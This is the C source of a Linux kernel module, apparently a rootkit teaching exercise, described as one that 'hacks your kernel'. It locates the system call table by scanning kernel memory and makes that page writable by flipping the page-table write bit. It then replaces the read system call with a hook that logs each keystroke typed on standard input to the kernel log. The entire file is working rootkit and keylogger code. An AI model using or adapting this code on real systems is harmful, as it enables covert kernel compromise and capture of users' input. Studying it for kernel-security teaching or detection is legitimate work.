#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/init.h>      /* Custom named entry/exit function */
#include <linux/unistd.h>    /* Original read-call */
#include <linux/syscalls.h>
#include <asm/cacheflush.h>  /* Needed for set_memory_ro, ...*/
#include <linux/smp_lock.h>

void unhook_function(void);

// for convenience, we're using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
typedef int (*fun_int_void)(void);
typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __user *, size_t);

fun_ssize_t_int_pvoid_size_t original_read;

// since we do not include sysmap.h, we have to construct ptr_sys_call_table "on our own"
// this is done by the function find_sys_call_table
void* ptr_sys_call_table;

unsigned long **find_sys_call_table(void)  {
  void** sys_call_table;
  sys_call_table = (void *)(&lock_kernel);
  while((void*)sys_call_table < (void*)(&loops_per_jiffy)) {
      if (sys_call_table[__NR_close] == sys_close){
          return (unsigned long **)sys_call_table;
      }
      sys_call_table = (void *)((char*)sys_call_table)+2;
  }
  return NULL;
}

/* Make a certain address writeable */
void make_page_writable(long unsigned int _addr){
    unsigned int dummy;
    pte_t *pageTableEntry = lookup_address(_addr, &dummy);

    pageTableEntry->pte |=  _PAGE_RW;
}

/* Make a certain address readonly */
void make_page_readonly(long unsigned int _addr){
    unsigned int dummy;
    pte_t *pageTableEntry = lookup_address(_addr, &dummy);
    pageTableEntry->pte = pageTableEntry->pte & ~_PAGE_RW;
}

asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
    ssize_t retval;
    char __user* cur_buf;
    retval = original_read(fd, buf, count);
    cur_buf = buf;
    if (retval > 0 && fd == 0){
        printk(KERN_INFO "User typed %c (%d)\n", *buf, *buf);
    }
    return retval;
}

/* Hooks the read system call. */
void hook_function(void){
  void** sys_call_table = (void *) ptr_sys_call_table;
  original_read = sys_call_table[__NR_read];

  make_page_writable((long unsigned int) ptr_sys_call_table);

  sys_call_table[__NR_read] = (void*) hooked_read;
}

/* Hooks the read system call. */
void unhook_function(void){
  void** sys_call_table = (void *) ptr_sys_call_table;
  make_page_writable((long unsigned int) ptr_sys_call_table);
  sys_call_table[__NR_read] = (void*) original_read;
  make_page_readonly((long unsigned int) ptr_sys_call_table);
}

/* Initialization routine */
static int __init _init_module(void)
{
    ptr_sys_call_table = find_sys_call_table();
    hook_function();
    return 0;
}

/* Exiting routine */
static void __exit _cleanup_module(void)
{
    unhook_function();
}


/* Declare init and exit routines */
module_init(_init_module);
module_exit(_cleanup_module);


/* OTHER STUFF */

/*
 * Get rid of taint message by declaring code as GPL.
 */
MODULE_LICENSE("GPL");

/*
 * Module information
 */
MODULE_AUTHOR("Philipp Müller, Roman Karlstetter");    /* Who wrote this module? */
MODULE_DESCRIPTION("hacks your kernel");                /* What does it do? */